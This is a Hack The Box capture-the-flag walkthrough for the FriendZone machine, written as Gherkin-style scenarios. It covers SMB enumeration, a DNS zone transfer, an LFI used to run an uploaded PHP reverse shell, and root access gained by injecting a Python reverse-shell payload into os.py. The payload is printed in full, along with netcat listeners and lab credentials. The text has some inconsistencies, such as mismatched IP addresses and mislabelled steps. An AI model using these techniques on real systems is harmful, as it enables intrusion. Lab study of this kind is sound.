## Version 2.0
## language: en

Feature:
  Site:
    Hack The Box
  Category:
    CTF
  User:
    aramirez95
  Goal:
    Get user and root flags

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | Metasploit      | 5.0.73-dev  |
    | SmbClient       | 4.11.5      |
    | SmbMap          | 2.0         |
  Machine information:
    Given the machine has an IP 10.10.10.123
    And it has a Linux operating system

  Scenario: Information gathering
    Given that I run the following "nmap" command
    """
    $ nmap -p- -sV 10.10.10.117 --open
    """
    When I see the command ends
    Then I get to see the result
    """
    PORT    STATE SERVICE     VERSION
    21/tcp  open  ftp         vsftpd 3.0.3
    22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
    |   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
    |_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
    53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
    | dns-nsid: 
    |_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
    80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Friend Zone Escape software
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    443/tcp open  ssl/http    Apache httpd 2.4.29
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: 404 Not Found
    | ssl-cert: Subject: 
      commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=
      CODERED/countryName=JO
    | Not valid before: 2018-10-05T21:02:30
    |_Not valid after:  2018-11-04T21:02:30
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
    Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    """
    And I can see that it has a service HTTP
    When I decide to run port 80
    Then a web page with a single image and has some texts
    And I download the image to scan it later
    When I make the decision to execute a command
    And it is to see if that port has any endpoint
    """
    $ gobuster dir -u http://10.10.10.117/
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
      -x php,txt,html
    """
    Then I see that it does not have an external service that is interesting
    When I go back to the website I analyze the code
    Then I see a text that catches my attention
    """
    <b>Email us at: info@friendzoneportal.red</b>
    """
    And It see that have another domain
    When I decide to put that domain in the file "/etc/hosts"
    """
    $ 10.10.10.123 friendzoneportal.red friendzone.red
    """
    Then I also put another domain on the host in case it has something interesting
    When I decide to search exploits for the "vsftpd" service
    """
    $ searchsploit vsftpd
    """
    And as a result I get this exploit
    """
    vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
    """
    When I realize that his version is inferior
    And that's why I discard that possibility

  Scenario: Fail: Image scan
    Given I downloaded an image
    When I make the decision to scan the image
    """
    $ steghide extract -sf fz.jpg
    """
    And unfortunately he asks me for a password

  Scenario: Success: Pass1 in SmbClient
    Given the machine has a SMB protocol
    When I decide to run this command
    """
    $ smbclient --list 10.10.10.123
    """
    Then it generates this result
    """
    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    Files           Disk      FriendZone Samba Server Files /etc/Files
    general         Disk      FriendZone Samba Server Files
    Development     Disk      FriendZone Samba Server Files
    IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
    """
    When I decided to run another command
    """
    $ smbmap -H 10.10.10.123
    """
    Then it generates this result
    """
    Disk            Permissions
    ---------       ----
    print$          No Access
    Files           No Access
    general         Read Only
    Development     Read, Write
    IPC$            No Access
    """
    And I decide to enter the "general" directory in this way
    """
    $ smbclient //10.10.10.123/general
    """
    When the result was a "SMB" terminal
    Then I execute an instruction to list the content
    """
    smb: \> ls
    """
    And the result it throws at me is this file
    """
    creds.txt
    """
    When I decide to get that file with this command
    """
    smb: \> get creds.txt
    """
    Then using the "//" fold in "smbclient"? This means my directory
    And I am in this directory
    """
    mrandrew@kali:~/Documents/FriendZone$
    """
    When we do an "ls" we see the file creds.txt
    And if we execute a "cat" command the result is "pass1"
    """
    WORKWORKHhallelujah@#
    """

  Scenario: Fail: Access FTP
    Given I already have the "pass1"
    When I decide to connect to FTP
    """
    $ ftp 10.10.10.123
    """
    And unfortunately the "pass1" didn't work

  Scenario: Fail: Access SSH
    Given I already have the "pass1"
    When I decide to connect to FTP
    """
    $ ssh admin@10.10.10.123
    """
    And unfortunately the "pass1" didn't work

  Scenario: Success: DNS zone transfer
    Given the machine has a DNS service
    When I decide to run a command
    """
    $ dig axfr friendzoneportal.red @10.10.10.123
    """
    Then I get I get multiple DNS as a result
    """
    admin.friendzoneportal.red
    files.friendzoneportal.red
    imports.friendzoneportal.red
    vpn.friendzoneportal.red
    """
    And I decide to execute the same command but with another DNS
    """
    $ dig axfr friendzone.red @10.10.10.123
    """
    And this is result
    """
    hr.friendzone.red
    uploads.friendzone.red
    administrator1.friendzone.red
    """

  Scenario: Success: Getting User Flag
    Given I found others DNS
    When I decide to add them to the "/etc/hosts" file
    Then I run those DNS
    And I get the same page that we found at port 80 at the beginning
    When I decide to run those DNS with "https"
    And that is because with "nmap" we find a "ssl / http" service
    When I run those DNS none have anything interesting except this
    """
    https://administrator1.friendzone.red
    """
    Then I get a Login in that interesting DNS
    And I log in with "pass1" and in the field "username" I put "admin"
    When I see alone this text
    """
    Login Done ! visit /dashboard.php
    """
    Then I decide to go that route
    """
    https://administrator1.friendzone.red/dashboard.php
    """
    When I see that the page has other text
    And it's a complaint about the lack of parameters in the URL
    When I see that has an example of how to upload a default image
    """
    image_id=a.jpg&pagename=timestamp
    """
    Then I get this text
    """
    Final Access timestamp is 1562715157
    """
    And with this I realize that the parameter "pagename" requests ".php" files
    When I make the decision to see if I can exploit an "LFI" vulnerability
    Then I decide to use a PHP "shell_rever" and name it "reverse.php"
    And I'm going to upload that file to the "Development" of the SMB
    """
    smb: \> put reverse.php
    """
    And make that decision because "Development" has write permissions
    When in the URL I pass the file "reverse.php" to the parameter "page name"
    """
    image_id=1.jpg&pagename=/etc/Development/reverse
    """
    Then I must have a netcat running
    """
    nc -lvnp 9001
    """
    And I already have a connection to a "shell" with the user "www-data"
    When I decide to go the "home" path
    """
    $ cd /home
    """
    Then with "ls" I see that has a user with the name "friend"
    When I decide to enter that user
    And when I execute an "ls" I see the "user.txt" file
    When I run the command "cat" I got the flag "root"
    """
    # FLAG USER = <FLAG>
    """

  Scenario: Fail: permissions to access the folder
    Given I already found the "user" flag
    When I decide to go to the "/" path
    """
    $ cd /
    """
    Then I see that it has a folder called "root"
    And I don't have permissions to access the folder

  Scenario: Success: Get pass2
    Given I don't have access to the "root" folder
    When I decide to see the "/ var" folder
    Then I run an "ls" command to see what that folder has
    """
    $ /www
    """
    When seeing that it has the folder "www"
    Then I see that this "www" folder is interesting
    When I go into the "www" folder I see another interesting file
    """
    $ mysql_data.conf
    """
    When I decide to run "cat" command on that file
    Then I get this result
    """
    db_user = friend
    db_pass = Agpyu12!0.213$
    """
    And with this I got pass2
    """
    pass2 = Agpyu12!0.213$
    """

  Scenario: Success: Access SSH
    Given I have a pass2
    When I decide to run that pass2 in SSH
    """
    $ ssh friend@10.10.10.123
    """
    And unfortunately the password does not work

  Scenario: Fail: Access root folder
    Given I am in "ssh" with the user "friend"
    When I decide to go to the "root" folder again
    Then I see that I don't have permissions with the "friend" user either

  Scenario: Success: Getting Root Flag
    Given I am still unable to enter the "root" folder
    When I decide to look at what file the "/opt" folder has with the "ls"
    """
    $ ls /opt
    """
    Then I see that as a result I get a folder named "server_admin"
    And I decide to look at what the "/server_admin" folder has with the "ls"
    """
    $ ls /server_admin
    """
    When I see that has a file "reporter.py"
    Then I execute the "cat" command
    And the interesting thing about the code is that it imports an "os" library
    When it gives me an idea to run a python exploit
    Then decided to go to the path "/usr/lib"
    And I decide to list the content only with the folders named "python2.7"
    """
    $ ls | grep python2.7
    """
    When I get a folder named "python2.7" and I go into that folder
    Then I decide to list but only those with the name "os"
    And as a result I get the file I needed and it is "os.py"
    When I decide to use the "cat" comment to see the code
    Then being inside the code, we can add other lines for a shell_reverse
    When i look for an exploit of this "swisskyrepo" repository on GitHub
    Then I must make small changes to this code
    """
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.34",9001))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    """
    And the changes is eliminate all the "os" because i'm inside the library
    When i removed the "os." and I put my "ip" and the "port"
    Then I can lift port "9001" with "netcat"
    """
    $ nc -lvnp 9001
    """
    And i run the file "reporter.py"
    """
    $ python reporter.py
    """
    When I run the file "reporter.py" I have a shell
    Then I run the "whoami" command to know if I am "root"
    And it only remains to do an ls command to find out if there is root.txt
    When I see that if there is the "root.txt"
    Then execute the "cat" command to have the "root" flag
    """
    # FLAG ROOT = <FLAG>
    """
